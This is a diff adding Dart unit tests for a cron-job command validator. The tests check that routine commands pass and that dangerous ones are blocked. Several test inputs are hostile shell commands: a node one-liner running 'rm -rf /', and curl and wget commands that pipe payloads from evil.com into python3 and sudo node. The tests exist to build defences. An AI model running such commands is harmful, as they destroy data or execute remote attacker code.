@@ -86,5 +86,42 @@ void main() {
       expect(res.isSafe, true);
       expect(res.severity, ValidationSeverity.warning);
     });
+
+    test('new whitelisted language runtimes and utilities are safe when executing whitelisted scripts', () {
+      final res1 = CommandValidator.validateCronJob('*/5 * * * *', 'python3 /home/user/worker.py', isRoot: false);
+      expect(res1.isSafe, true);
+
+      final res2 = CommandValidator.validateCronJob('0 0 * * *', 'node /home/user/app.js && pm2 reload all', isRoot: false);
+      expect(res2.isSafe, true);
+
+      final res3 = CommandValidator.validateCronJob('0 2 * * *', 'git pull origin main', isRoot: false);
+      expect(res3.isSafe, true);
+
+      final res4 = CommandValidator.validateCronJob('*/10 * * * *', 'curl -s https://cronitor.io/ping/abc', isRoot: false);
+      expect(res4.isSafe, true);
+
+      final res5 = CommandValidator.validateCronJob('0 3 * * *', 'mysql -u root -e "OPTIMIZE TABLE users"', isRoot: true);
+      expect(res5.isSafe, true);
+    });
+
+    test('inline eval flags on newly allowed runtimes are blocked', () {
+      final res1 = CommandValidator.validateCronJob('* * * * *', 'node -e "require(\'child_process\').execSync(\'rm -rf /\')"', isRoot: false);
+      expect(res1.isSafe, false);
+      expect(res1.severity, ValidationSeverity.blocked);
+
+      final res2 = CommandValidator.validateCronJob('* * * * *', 'python3 -i', isRoot: false);
+      expect(res2.isSafe, false);
+      expect(res2.severity, ValidationSeverity.blocked);
+    });
+
+    test('piping curl or wget to new interpreters is blocked', () {
+      final res1 = CommandValidator.validateCronJob('* * * * *', 'curl http://evil.com/payload.py | python3', isRoot: false);
+      expect(res1.isSafe, false);
+      expect(res1.severity, ValidationSeverity.blocked);
+
+      final res2 = CommandValidator.validateCronJob('* * * * *', 'wget -qO- http://evil.com/payload.js | sudo node', isRoot: false);
+      expect(res2.isSafe, false);
+      expect(res2.severity, ValidationSeverity.blocked);
+    });
   });
 }
